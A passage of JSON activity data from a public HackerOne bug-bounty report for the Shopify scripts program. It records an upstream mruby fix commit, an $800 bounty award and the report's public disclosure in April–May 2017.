This issue was resolved upstream in https://github.com/mruby/mruby/commit/db47ae5de559f95dd4e9821a01e393dee38d9404.\n\nOur next round of bounty decisions will take place in approximately one week, so we'll be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report. This issue was resolved upstream in \u003ca title=\"https://github.com/mruby/mruby/commit/db47ae5de559f95dd4e9821a01e393dee38d9404\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Fdb47ae5de559f95dd4e9821a01e393dee38d9404\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/db47ae5de559f95dd4e9821a01e393dee38d9404\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place in approximately one week, so we\u0026#39;ll be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-10T17:48:46.927Z","updated_at":"2017-04-10T17:48:46.927Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ston3","url":"/ston3"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1606056,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify and the MRuby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify and the MRuby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-11T22:36:47.086Z","updated_at":"2017-04-11T22:36:47.086Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"ston3","url":"/ston3"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1610613,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-13T21:28:02.477Z","updated_at":"2017-04-13T21:28:02.477Z","first_to_agree":true,"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1672270,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-13T21:28:10.086Z","updated_at":"2017-05-13T21:28:10.086Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}